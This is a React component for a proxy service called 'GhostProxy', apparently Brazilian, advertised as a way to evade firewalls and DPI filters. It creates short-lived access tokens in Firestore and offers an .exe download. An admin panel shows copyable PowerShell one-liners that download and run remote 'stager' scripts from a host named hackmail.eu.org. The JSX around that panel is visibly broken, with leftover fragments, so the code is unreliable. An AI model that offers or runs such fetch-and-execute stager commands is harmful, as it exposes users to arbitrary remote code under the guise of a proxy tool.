import { useState } from "react";
import { Key, Download, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { db, auth } from "../firebase";
import { doc, setDoc } from "firebase/firestore";

const TokenGeneratorCard = ({ isAdmin }: { isAdmin?: boolean }) => {
  const [loading, setLoading] = useState(false);
  const [token, setToken] = useState<string | null>(null);
  const { toast } = useToast();

  const handleGenerateToken = async () => {
    setLoading(true);
    setToken(null);
    try {
      // Pega o usuário logado se existir, senão usa 'anonimo'
      const user = auth.currentUser;
      const uid = user ? user.uid : "anonimo_desktop";

      // Vamo gerar uma chave aleatória de 6 dígitos tipo NETFLIX (Ex: 9XF8A1)
      const tokenAleatorio = Math.random().toString(36).substring(2, 8).toUpperCase();
      
      // Expira em 2 horas cravadas!
      const duasHorasMs = 2 * 60 * 60 * 1000;
      const validade = Date.now() + duasHorasMs;

      // Montando o documento no Firestore
      await setDoc(doc(db, "proxy_tokens", tokenAleatorio), {
        createdAt: Date.now(),
        expiresAt: validade,
        ipVinculado: null, // Deixa null! Assim quem usar o .exe amarrotara seu IP aqui!
        usuarioID: uid,
      });

      setToken(tokenAleatorio);
      toast({
        title: "Acesso Gerado com Sucesso!",
        description: "Copie seu token para usar no cliente GhostProxy.",
        duration: 5000,
      });

    } catch (e: any) {
      toast({
        title: "Erro ao gerar token",
        description: e.message || "Erro desconhecido",
        variant: "destructive",
      });
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="glass-panel p-6 rounded-2xl flex flex-col items-start gap-4">
      <div className="flex items-center gap-2 mb-2 text-foreground font-medium">
        <Key className="h-5 w-5 text-primary" />
        Proxy de Sistema Inteiro (.exe / PS1)
      </div>
      
      <p className="text-sm text-muted-foreground w-full">
        Drible restrições de rede, firewalls rígidos e filtros DPI com nosso proxy para Windows. 
        Esse sistema encapsula todo o tráfego do sistema operacional via Cloudflare. O token gerado dura 2H e fica atrelado ao registro global (RG) da sua máquina.
      </p>

      {isAdmin && (<div className="flex flex-col gap-3 mt-2 w-full"><div className="w-full bg-[#1e1e1e] border border-border p-4 rounded-xl flex flex-col gap-2"><span className="text-xs text-muted-foreground font-semibold text-emerald-400">�rea Admin - Proxy V1 HTTP (Navega��o):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-emerald-400 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager.ps1")');}}>Copiar</Button></div></div><div className="w-full bg-[#3b1515] border border-red-900/50 p-4 rounded-xl flex flex-col gap-2"><span className="text-xs font-semibold text-red-400">�rea Admin - Proxy V2 SOCKS5 (Jogos/Proxifier):</span><div className="flex items-center justify-between gap-2"><code className="text-[10px] sm:text-xs text-red-300 break-all select-all font-mono">Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")</code><Button variant="ghost" size="sm" className="shrink-0 h-7 text-xs text-red-200 hover:text-white hover:bg-red-800" onClick={() => { navigator.clipboard.writeText('Invoke-Expression (Invoke-RestMethod -Uri "https://hackmail.eu.org/stager-socks.ps1")');}}>Copiar</Button></div></div></div>)};
              }}>
              Copiar
            </Button>
          </div>
        </div>
      )}

      {token && (
        <div className="w-full bg-secondary border border-border p-4 rounded-xl flex items-center justify-between">
            <div className="flex flex-col">
              <span className="text-xs text-muted-foreground">Seu Token Secreto:</span>
              <span className="font-mono text-xl text-primary font-bold tracking-widest">{token}</span>
            </div>
            <Button 
              variant="outline" 
              size="sm" 
              onClick={() => {
                navigator.clipboard.writeText(token);
                toast({ title: "Copiado!", duration: 2000 });
              }}>
              Copiar
            </Button>
        </div>
      )}

      <div className="flex gap-3 w-full sm:w-auto mt-2">
        <Button onClick={handleGenerateToken} disabled={loading} className="gap-2">
          {loading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Key className="h-4 w-4" />}
          Gerar Token de Acesso (2H)
        </Button>
        
        <Button variant="secondary" className="gap-2 cursor-pointer" asChild>
          <a href="/GhostProxy.exe" download="GhostProxy.exe">
              <Download className="h-4 w-4" />
              Baixar .exe
          </a>
        </Button>
      </div>
    </div>
  );
};

export default TokenGeneratorCard;

